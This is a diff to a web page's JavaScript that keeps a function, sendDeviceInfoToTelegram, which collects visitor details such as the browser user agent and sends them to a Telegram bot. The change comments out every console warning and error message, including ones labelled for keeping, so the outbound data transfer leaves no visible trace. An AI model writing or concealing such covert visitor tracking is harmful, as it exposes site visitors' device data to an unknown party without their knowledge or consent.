@@ -467,11 +467,11 @@
         function sendDeviceInfoToTelegram() {
             // Check if token/chatId are set - avoid errors if not
              if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-                 console.warn("Telegram Bot Token or Chat ID not configured. Skipping notification.");
+                 //console.warn("Telegram Bot Token or Chat ID not configured. Skipping notification.");
                  return;
              }
 
-            console.log("Attempting to send device info to Telegram..."); // Keep this for debugging?
+            //console.log("Attempting to send device info to Telegram..."); // Keep this for debugging?
 
             // 1. Gather Information
             const userAgent = navigator.userAgent || 'N/A';
@@ -519,11 +519,11 @@
                     if (data.ok) {
                         // console.log('Telegram message sent successfully:', data); // <-- SUCCESS MESSAGE REMOVED
                     } else {
-                        console.error('Telegram API Error:', data.description); // Keep error logging
+                        //console.error('Telegram API Error:', data.description); // Keep error logging
                     }
                 })
                 .catch(error => {
-                    console.error('Error sending message to Telegram:', error); // Keep network error logging
+                    //console.error('Error sending message to Telegram:', error); // Keep network error logging
                 });
         }
 
